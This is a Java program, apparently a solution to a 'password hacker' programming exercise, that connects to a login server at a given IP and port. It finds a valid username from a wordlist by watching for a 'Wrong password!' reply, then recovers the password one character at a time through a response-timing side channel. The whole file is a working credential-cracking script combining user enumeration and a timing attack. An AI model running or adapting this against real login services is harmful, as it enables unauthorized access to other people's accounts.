package hacker;

import com.google.gson.Gson;
import com.google.gson.JsonObject;

import java.io.*;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.Scanner;

public class Main {
    private static final Gson gson = new Gson();

    public static void main(String[] args) {
        if (args.length != 2) {
            System.out.println("Usage: java hacker.Main <IP address> <port>");
            return;
        }

        String ip = args[0];
        int port = Integer.parseInt(args[1]);

        try (Socket socket = new Socket()) {
            socket.connect(new InetSocketAddress(ip, port), 5000);
            socket.setSoTimeout(13000);
            DataOutputStream out = new DataOutputStream(socket.getOutputStream());
            DataInputStream in = new DataInputStream(socket.getInputStream());

            File loginsFile = new File("C:\\Users\\teocl\\Downloads\\logins.txt");
            String correctLogin = findCorrectLogin(loginsFile, out, in);
            String password = findPassword(correctLogin, out, in);

            JsonObject result = new JsonObject();
            result.addProperty("login", correctLogin);
            result.addProperty("password", password);
            System.out.println(gson.toJson(result));

        } catch (IOException e) {
            System.out.println("IOException occurred: " + e.getMessage());
        }
    }

    private static String findCorrectLogin(File file, DataOutputStream out, DataInputStream in) throws IOException {
        try (Scanner scanner = new Scanner(file)) {
            while (scanner.hasNext()) {
                String login = scanner.nextLine();
                JsonObject request = new JsonObject();
                request.addProperty("login", login);
                request.addProperty("password", "");

                out.writeUTF(gson.toJson(request));

                String response = in.readUTF();
                JsonObject jsonResponse = gson.fromJson(response, JsonObject.class);
                String result = jsonResponse.get("result").getAsString();

                if ("Wrong password!".equals(result)) {
                    return login;
                }
            }
        } catch (FileNotFoundException e) {
            System.out.println("File not found: " + file.getName());
        }
        return null;
    }

    private static String findPassword(String login, DataOutputStream out, DataInputStream in) throws IOException {
        StringBuilder passwordBuilder = new StringBuilder();
        String characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        boolean passwordFound = false;

        while (!passwordFound) {
            for (char ch : characters.toCharArray()) {
                String testPassword = passwordBuilder.toString() + ch;
                JsonObject request = new JsonObject();
                request.addProperty("login", login);
                request.addProperty("password", testPassword);

                out.writeUTF(gson.toJson(request));
                long startTime = System.nanoTime();

                String response = in.readUTF();
                long endTime = System.nanoTime();
                JsonObject jsonResponse = gson.fromJson(response, JsonObject.class);
                String result = jsonResponse.get("result").getAsString();

                if ("Connection success!".equals(result)) {
                    passwordBuilder.append(ch);
                    passwordFound = true;
                    break;
                } else if ((endTime - startTime) > 100000000) {
                    passwordBuilder.append(ch);
                    break;
                }
            }
        }

        return passwordBuilder.toString();
    }
}
